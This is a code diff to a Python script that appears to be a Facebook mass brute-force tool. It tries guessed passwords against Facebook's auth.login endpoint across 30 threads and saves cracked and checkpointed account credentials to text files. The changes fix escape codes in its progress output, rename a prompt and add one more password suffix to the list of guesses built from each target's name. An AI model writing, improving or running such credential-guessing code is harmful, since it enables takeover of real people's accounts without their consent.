@@ -96,7 +96,7 @@ def mbf():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"#r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
+                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
@@ -105,7 +105,7 @@ def mbf():
                         with open('results-life.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"#r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
+                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
@@ -116,7 +116,7 @@ def mbf():
              else:
                    die += 1
              for i in list('\|/-•'):
-                            print(f"#r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
+                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -258,7 +258,7 @@ def mbf():
                    else:
                          exit("\033[00m[\033[91m!\033[00m] wrong choice")
                    print()
-                   expass = input("\033[90m> \033[00mExtra Password: \033[1;92m")
+                   expass = input("\033[90m> \033[32;1mTebak Password: \033[1;92m")
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
@@ -268,6 +268,7 @@ def mbf():
                                                   str(x) + '123',
                                                   str(x) + '12345',
                                                   str(x) + '123456',
+                                                  str(x) + 'sayang',
                                                   str(x) + '12',
                                                   str(x) + 'kontol',
                                                   str(x) + '12739108',
